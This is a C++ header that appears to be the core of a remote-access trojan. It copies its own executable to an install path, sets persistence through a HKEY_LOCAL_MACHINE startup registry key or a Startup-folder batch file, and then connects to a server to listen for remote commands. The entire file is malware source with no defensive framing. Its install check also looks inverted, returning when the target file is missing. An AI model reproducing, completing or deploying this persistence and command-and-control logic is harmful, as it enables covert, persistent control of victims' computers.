#pragma once
#include"Network.h"
#include"CommandMap.h"

#include"Ronin.h"
#include"TranslateTemplate.h"
#include"FileHelper.h"
#include"Pathes.h"
#include"Registry.h"

//commands
#include"Hello.h"

class App{
private:
	static void Install() {
		//path
		char* installed_path = Helper::strTochr(Helper::Translate(
			INSTALL_PATH,
			TranslateTemplate::getTemplate()
		));

		//file not exists
		if (!Helper::FileExists(installed_path)) {
			return;
		}
		
		//copy file new path
		FileHelper::CopyTo(SystemInfo::GetExecutablePath(), installed_path);

		if (START_UP) {
			//registry startup
			if (START_UP_METHOD == 1) {
				Registry rg;
				
				char* subkey = Pathes::StartUpRegistr();

				rg.setRegistryKey(HKEY_LOCAL_MACHINE);
				rg.setRegistrySubkey(subkey);

				rg.UpdateRegistry(APP_NAME, installed_path, REG_SZ);
			}

			//file startup
			if (START_UP_METHOD == 2) {
				string startup_filename = Helper::Translate(
					"/<APPNAME>.bat",
					TranslateTemplate::getTemplate()
				);

				char* startup_path = Helper::ConcatChr(
					Pathes::StartUpFolder(),
					Helper::strTochr(startup_filename)
				);

				//create startup
				SysFile sf;

				sf.Open(startup_path, SysFile::Write).WriteFile(
					"@echo off\nstart "
				);
				sf.WriteFile(installed_path);

				sf.Close();
				
			}
		}
	}

public:
	static void Run(){
		//check installed and install
		Install();

		//use class
		Hello ho;
		CommandMap::Init().Add(&ho);

		//connect and listen on server
		if (Network::Init().Connect()){
			Network::Init().Listen();
		}
	}
};